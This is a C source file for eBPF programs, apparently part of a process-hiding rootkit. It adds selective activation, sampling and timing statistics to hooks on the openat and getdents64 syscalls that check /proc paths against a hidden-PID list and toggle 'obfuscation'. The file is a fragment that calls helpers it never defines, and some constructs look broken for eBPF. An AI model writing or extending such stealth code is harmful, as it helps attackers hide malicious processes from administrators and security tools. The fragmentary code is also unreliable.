/* =====================================================
 *  Selective Hook Activation for Performance Optimization
 *  Chỉ activate hooks khi cần thiết
 * ===================================================== */

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>

/* Performance control flags */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 16);
    __type(key, u32);
    __type(value, u32);
} perf_control_map SEC(".maps");

/* Performance counters */
struct perf_stats {
    u64 hook_calls;
    u64 filtered_calls;
    u64 processing_time_ns;
    u64 last_reset;
};

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, u32);
    __type(value, struct perf_stats);
} perf_stats_map SEC(".maps");

/* Control flags */
#define PERF_ENABLE_OPENAT_HOOK     0
#define PERF_ENABLE_GETDENTS_HOOK   1
#define PERF_ENABLE_STAT_HOOK       2
#define PERF_ENABLE_SIGNAL_HOOK     3
#define PERF_ADAPTIVE_MODE          4
#define PERF_HIGH_PERFORMANCE_MODE  5

/* Check if hook should be active */
static __always_inline bool should_activate_hook(u32 hook_type) {
    u32 *flag = bpf_map_lookup_elem(&perf_control_map, &hook_type);
    if (!flag) {
        return false;  /* Default: disabled */
    }
    return *flag == 1;
}

/* Update performance stats */
static __always_inline void update_perf_stats(bool processed) {
    u32 key = 0;
    struct perf_stats *stats = bpf_map_lookup_elem(&perf_stats_map, &key);
    if (!stats) {
        return;
    }
    
    stats->hook_calls++;
    if (processed) {
        stats->filtered_calls++;
    }
}

/* Adaptive performance mode */
static __always_inline bool should_skip_for_performance(void) {
    u32 key = PERF_HIGH_PERFORMANCE_MODE;
    u32 *high_perf = bpf_map_lookup_elem(&perf_control_map, &key);
    
    if (high_perf && *high_perf == 1) {
        /* In high performance mode, skip non-critical checks */
        u32 current_pid = bpf_get_current_pid_tgid() >> 32;
        
        /* Quick check: only process if PID is likely to be hidden */
        if (current_pid < 1000) {
            return true;  /* Skip system processes */
        }
    }
    
    return false;
}

/* Optimized openat hook with selective activation */
SEC("tracepoint/syscalls/sys_enter_openat")
int optimized_hide_openat_syscall(struct trace_event_raw_sys_enter *ctx)
{
    /* Quick performance check */
    if (!should_activate_hook(PERF_ENABLE_OPENAT_HOOK)) {
        return 0;
    }
    
    if (should_skip_for_performance()) {
        return 0;
    }
    
    u64 start_time = bpf_ktime_get_ns();
    bool processed = false;
    
    /* Fast path: check obfuscation flag first */
    if (!is_obfuscation_enabled()) {
        goto update_stats;
    }
    
    /* Get filename with bounds checking */
    const char *filename = (const char *)ctx->args[1];
    if (!filename) {
        goto update_stats;
    }
    
    /* Optimized path checking - avoid full string copy */
    char first_chars[8];
    if (bpf_probe_read_user(first_chars, 6, filename) < 0) {
        goto update_stats;
    }
    
    /* Quick check for /proc prefix */
    if (first_chars[0] != '/' || first_chars[1] != 'p' || 
        first_chars[2] != 'r' || first_chars[3] != 'o' || 
        first_chars[4] != 'c' || first_chars[5] != '/') {
        goto update_stats;
    }
    
    /* Only do full processing for /proc paths */
    char path[64];  /* Reduced buffer size */
    if (bpf_probe_read_user_str(path, sizeof(path), filename) < 0) {
        goto update_stats;
    }
    
    u32 pid = extract_pid_from_proc_path(path);
    if (pid > 0 && is_hidden_pid(pid)) {
        submit_event(8, pid);
        processed = true;
    }
    
update_stats:
    /* Update performance statistics */
    update_perf_stats(processed);
    
    /* Track processing time */
    u64 end_time = bpf_ktime_get_ns();
    u32 key = 0;
    struct perf_stats *stats = bpf_map_lookup_elem(&perf_stats_map, &key);
    if (stats) {
        stats->processing_time_ns += (end_time - start_time);
    }
    
    return 0;
}

/* Batch processing for getdents64 */
SEC("tracepoint/syscalls/sys_enter_getdents64")
int optimized_hide_getdents64_syscall(struct trace_event_raw_sys_enter *ctx)
{
    if (!should_activate_hook(PERF_ENABLE_GETDENTS_HOOK)) {
        return 0;
    }
    
    /* Use batch processing to reduce per-call overhead */
    static u32 batch_counter = 0;
    batch_counter++;
    
    /* Process every 10th call in high performance mode */
    u32 key = PERF_HIGH_PERFORMANCE_MODE;
    u32 *high_perf = bpf_map_lookup_elem(&perf_control_map, &key);
    if (high_perf && *high_perf == 1 && (batch_counter % 10) != 0) {
        return 0;
    }
    
    /* Continue with optimized processing */
    return hide_getdents64_syscall_original(ctx);
}

/* Performance control interface */
static int set_performance_mode(u32 mode) {
    u32 key, value;
    
    switch (mode) {
        case 0:  /* Balanced mode */
            key = PERF_ENABLE_OPENAT_HOOK; value = 1;
            bpf_map_update_elem(&perf_control_map, &key, &value, BPF_ANY);
            key = PERF_ENABLE_GETDENTS_HOOK; value = 1;
            bpf_map_update_elem(&perf_control_map, &key, &value, BPF_ANY);
            key = PERF_HIGH_PERFORMANCE_MODE; value = 0;
            bpf_map_update_elem(&perf_control_map, &key, &value, BPF_ANY);
            break;
            
        case 1:  /* High performance mode */
            key = PERF_HIGH_PERFORMANCE_MODE; value = 1;
            bpf_map_update_elem(&perf_control_map, &key, &value, BPF_ANY);
            /* Reduce hook frequency */
            break;
            
        case 2:  /* Maximum security mode */
            key = PERF_HIGH_PERFORMANCE_MODE; value = 0;
            bpf_map_update_elem(&perf_control_map, &key, &value, BPF_ANY);
            /* Enable all hooks */
            break;
    }
    
    return 0;
}
